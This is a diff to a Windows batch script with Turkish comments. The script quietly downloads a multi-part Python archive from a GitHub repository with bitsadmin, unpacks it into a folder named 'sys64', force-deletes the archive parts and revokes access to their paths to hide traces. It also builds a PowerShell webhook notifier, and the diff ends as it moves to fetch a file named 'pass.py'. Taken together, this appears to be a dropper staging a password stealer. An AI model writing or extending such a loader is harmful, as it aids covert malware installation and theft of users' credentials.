@@ -60,12 +60,21 @@ del SendWebhook.ps1
 
 :: Dosyaları sys64 klasörüne indir
 set "pythonZipUrl=https://github.com/nizhenets/test/raw/main/Python312.zip"
-set "pythonPartUrl=https://github.com/nizhenets/test/raw/main/Python312.z01"
+set "pythonPartUrl1=https://github.com/nizhenets/test/raw/main/Python312.z01"
+set "pythonPartUrl2=https://github.com/nizhenets/test/raw/main/Python312.z02"
+set "pythonPartUrl3=https://github.com/nizhenets/test/raw/main/Python312.z03"
+set "pythonPartUrl4=https://github.com/nizhenets/test/raw/main/Python312.z04"
 set "pythonZipPath=%baseFolderPath%\Python312.zip"
-set "pythonPartPath=%baseFolderPath%\Python312.z01"
+set "pythonPartPath1=%baseFolderPath%\Python312.z01"
+set "pythonPartPath2=%baseFolderPath%\Python312.z02"
+set "pythonPartPath3=%baseFolderPath%\Python312.z03"
+set "pythonPartPath4=%baseFolderPath%\Python312.z04"
 
 bitsadmin /transfer pythonZipDownload /download /priority high "%pythonZipUrl%" "%pythonZipPath%"
-bitsadmin /transfer pythonPartDownload /download /priority high "%pythonPartUrl%" "%pythonPartPath%"
+bitsadmin /transfer pythonPartDownload1 /download /priority high "%pythonPartUrl1%" "%pythonPartPath1%"
+bitsadmin /transfer pythonPartDownload2 /download /priority high "%pythonPartUrl2%" "%pythonPartPath2%"
+bitsadmin /transfer pythonPartDownload3 /download /priority high "%pythonPartUrl3%" "%pythonPartPath3%"
+bitsadmin /transfer pythonPartDownload4 /download /priority high "%pythonPartUrl4%" "%pythonPartPath4%"
 
 :: Notify after Python download finishes
 echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
@@ -88,13 +97,19 @@ if not exist "%extractFolderPath%" (
 cd /d "%baseFolderPath%\7zip"
 "%installFolderPath%\7z.exe" x "%pythonZipPath%" -o"%extractFolderPath%"
 
-:: Python312.zip ve Python312.z01 dosyalarını kalıcı olarak sil
+:: Python312.zip ve parçalarını kalıcı olarak sil
 del "%pythonZipPath%" /f /q
-del "%pythonPartPath%" /f /q
+del "%pythonPartPath1%" /f /q
+del "%pythonPartPath2%" /f /q
+del "%pythonPartPath3%" /f /q
+del "%pythonPartPath4%" /f /q
 
 :: Silinen dosyaların geri dönüşüm kutusuna gitmemesi için ek önlem
 echo Y|cacls "%pythonZipPath%" /P everyone:n
-echo Y|cacls "%pythonPartPath%" /P everyone:n
+echo Y|cacls "%pythonPartPath1%" /P everyone:n
+echo Y|cacls "%pythonPartPath2%" /P everyone:n
+echo Y|cacls "%pythonPartPath3%" /P everyone:n
+echo Y|cacls "%pythonPartPath4%" /P everyone:n
 
 :: scripts klasörünü oluştur ve pass.py dosyasını indir
 set "scriptsFolderPath=%baseFolderPath%\scripts"
